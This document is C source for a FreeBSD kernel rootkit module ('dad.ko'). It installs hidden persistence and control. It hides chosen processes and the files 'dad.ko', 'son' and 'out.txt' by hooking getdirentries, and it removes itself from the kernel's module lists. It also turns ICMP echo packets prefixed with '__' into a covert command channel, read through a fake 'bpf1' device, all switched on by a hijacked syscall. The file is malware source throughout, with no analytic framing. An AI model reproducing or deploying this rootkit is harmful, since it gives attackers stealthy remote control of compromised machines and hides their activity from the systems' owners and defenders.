#include <sys/fcntl.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/conf.h>
#include <sys/uio.h>
#include <sys/pcpu.h>
#include <sys/syscallsubr.h>
#include <sys/file.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/linker.h>
#include <sys/libkern.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <sys/conf.h>
#include <sys/uio.h>
#include <sys/ioccom.h>


#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

// Module hiding

#include <sys/dirent.h>
#define MODULE "dad.ko"

// Variables to hide modules
extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;
typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
	TAILQ_ENTRY(module) link;  	// chain together all modules
	TAILQ_ENTRY(module) flink; 	// all modules in a file
	struct linker_file *file;  	// file which contains module
	int refs;		   	// reference count
	int id;			   	// unique id
	char *name;		   	// module name
	modeventhand_t handler;	   	// event handler
	void *arg;		   	// argument for handler
	modspecific_t data;	   	// module specific data
};

// new stuff - command buffer, things to hide, direntbuffer, stuff for icmp hooking
char *T_NAME[] = {"dad.ko", "son", "out.txt"};
static char cmd[256+1];
static struct sx cmd_lock;
MALLOC_DECLARE(M_TEMP);
MALLOC_DEFINE(M_TEMP, "direntbuf", "direntbuffer");
extern struct protosw inetsw[];
pr_input_t icmp_input_hook;

static int last_kld = -1;

// code for handling device creation related to new shell func

int dev_open(struct cdev *dev, int flag, int otyp, struct thread *td);
int dev_close(struct cdev *dev, int flag, int otyp, struct thread *td);
int dev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td);
int dev_write(struct cdev *dev, struct uio *uio, int ioflag);
int dev_read(struct cdev *dev, struct uio *uio, int ioflag);

d_open_t topen;
d_close_t tclose;
d_read_t tread;
d_write_t twrite;

static struct cdevsw devsw = {
         .d_version = D_VERSION,
         .d_open = dev_open,
         .d_close = dev_close,
         .d_read = dev_read,
         .d_write = dev_write,
         .d_ioctl = dev_ioctl,
         .d_name = "bpf1"
};

static struct cdev *sdev;

int dev_open(struct cdev *dev, int flag, int otyp, struct thread *td)
{
    return 0;
}

int dev_close(struct cdev *dev, int flag, int otyp, struct thread *td)
{
    return 0;
}

int dev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td)
{
    return 0;
}


int dev_write(struct cdev *dev, struct uio *uio, int ioflag)
{
    return 0;
}

int dev_read(struct cdev *dev, struct uio *uio, int ioflag)
{
    size_t len;
    
    sx_xlock(&cmd_lock);
    copystr(&cmd, uio->uio_iov->iov_base, strlen(cmd)+1, &len);
    
    bzero(cmd,256);
    sx_xunlock(&cmd_lock);
    
    return 0;
}

struct process_hiding_args {
	char *procname;
};

static int process_hiding(struct thread *thread, void *args) {
	struct process_hiding_args *uap;
	uap = (struct process_hiding_args *)args;
	struct proc *p;

	sx_xlock(&allproc_lock);

	/* Iterate through the allproc list. */
	LIST_FOREACH(p, &allproc, p_list) {
		PROC_LOCK(p);

		if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
			PROC_UNLOCK(p);
			continue;
		}

		/* Do we want to hide this process? */
		if (strncmp(p->p_comm, uap->procname, MAXCOMLEN) == 0) {
			LIST_REMOVE(p, p_list);
			LIST_REMOVE(p, p_hash);
		}

		PROC_UNLOCK(p);
	}

	sx_xunlock(&allproc_lock);

	return(0);
}

// icmp shell handler stuff

int icmp_input_hook(struct mbuf **m, int *off, int proto)
{

    struct icmp *icmp_header;
    char str[256+1];
    int cnt;
	size_t len;
    
    (*m)->m_len -= *off;
    (*m)->m_data += *off;
    
    icmp_header = mtod(*m, struct icmp *);
    
    (*m)->m_len += *off;
    (*m)->m_data -= *off;
    
    if (icmp_header->icmp_type == ICMP_ECHO) {
        bzero(str,256);
        copystr(icmp_header->icmp_data, str, 256, &len);
        
        if(strlen(str) > 2) {
            if(str[0] == '_' && str[1] == '_') {
                cnt = 2;
                
                sx_xlock(&cmd_lock);
                
                bzero(cmd,256);
                while(str[cnt] != ';' && cnt < 256) {
                    cmd[cnt-2] = str[cnt];
                    cnt++;
                }
                
                cmd[cnt] = '\0';
                sx_xunlock(&cmd_lock);

            } 
            else {
                return(icmp_input(m,off,proto));
            }
        }
        
        else {
            return(icmp_input(m,off,proto));
        }
    }
    
    else {
        return(icmp_input(m, off,proto));
    }
    
    return(icmp_input(m, off,proto));
}

static int getdirentries_hook(struct thread *td, void *syscall_args) {
    struct getdirentries_args  *uap;
    uap = (struct getdirentries_args *)syscall_args;
    
    struct dirent *dp, *current;
    unsigned int size, count;
    

    sys_getdirentries(td, syscall_args);
    size = td->td_retval[0];
    
    if (size > 0) {
		dp = malloc(size, M_TEMP, M_NOWAIT);
        copyin(uap->buf, dp, size);
        
        current = dp;
        count = size;

        while ((current->d_reclen != 0) && (count > 0)) {
            count -= current->d_reclen;
            
            if(strcmp((char *)&(current->d_name), T_NAME[0]) == 0 || strcmp((char *)&(current->d_name), T_NAME[1])==0 || strcmp((char *)&(current->d_name), T_NAME[2])==0) {
                if (count != 0)
                    bcopy((char *)current +
                          current->d_reclen, current,
                          count);
                
                size -= current->d_reclen;
                break;
            }
            

            if (count != 0)
                current = (struct dirent *)((char *)current +
                                            current->d_reclen);
        }
        

        td->td_retval[0] = size;
        copyout(dp, uap->buf, size);
        
        free(dp, M_TEMP);
    }
    return(0);
}

static int hide_kld(void) {
		// Lock mutex on kld list and kernel so we can modify
		// linker_files, modify kernel image's ref cnt
		// should probably do this, but this broke it on BSD
		// commenting this out fixed it so :shrug:
		struct linker_file *lf;
    	struct module *mod;
		mtx_lock(&Giant);
		sx_xlock(&kld_sx);
		
		// Decrement kernel image's ref cnt
		if ((&linker_files)->tqh_first->refs > 2) {
			(&linker_files)->tqh_first->refs--;
		}

		// Iterate through linker_files list. If file is dad.ko
		// (MODULE), decrement next_file_id and remove from list.

		TAILQ_FOREACH(lf, &linker_files, link) {
			if(strcmp(lf->filename, MODULE) == 0) {
				if (next_file_id == lf->id) {
					last_kld = 1;
				} else {
					last_kld = 0;
				}

				if (last_kld) {
					next_file_id--;
				}
				TAILQ_REMOVE(&linker_files, lf, link);
				break;
			}
		}

		// Release linker_files mutexs.

		sx_xunlock(&kld_sx);
		mtx_unlock(&Giant);

		MOD_XLOCK;
		// Now, remove dad.ko from the modules list too.
		TAILQ_FOREACH(mod, &modules, link) {
			if(strcmp(mod->name, "dad") == 0) {
				nextid--;
				TAILQ_REMOVE(&modules, mod, link);
				break;
			}
		}
		MOD_XUNLOCK;
		return 0;
}

static int general_handler(struct thread *td, void *syscall_args) {
	struct process_hiding_args *uap;
	uap = (struct process_hiding_args *)syscall_args;
	if (strcmp(uap->procname, "on") == 0)
    {
        sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;   
        sx_init(&cmd_lock,"rootkit_lock");
        inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
        sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "bpf1");
        //hide_kld();
    } else {
		process_hiding(td, syscall_args);
	}

	return(0);
}

/* The sysent for the new system call. */
static struct sysent dad_sysent = {
	0,			/* number of arguments */
	general_handler		/* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = 216;

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		break;

	case MOD_UNLOAD:
		break;

	default:
		error = EOPNOTSUPP;
		break;
	}

	return(error);
}

SYSCALL_MODULE(dad, &offset, &dad_sysent, load, 0);
